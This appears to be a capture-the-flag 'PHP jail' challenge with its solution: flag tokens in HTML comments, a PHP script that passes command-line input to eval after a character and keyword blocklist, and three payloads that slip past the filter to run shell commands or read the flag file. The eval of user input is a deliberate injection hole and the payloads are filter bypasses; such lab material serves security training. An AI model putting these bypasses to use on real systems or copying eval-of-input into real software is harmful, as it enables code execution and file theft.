<!-- FLAG-sW66QEY4y6724723c7w1i0oMt179E75y -->
<!-- FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL -->
<!-- FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H -->

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
     // if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>

print `dd <$(printf 'fl%xg.txt' 10)`;
popen("vim", "w");
print highlight_file(glob('fl*g*txt')[0]);


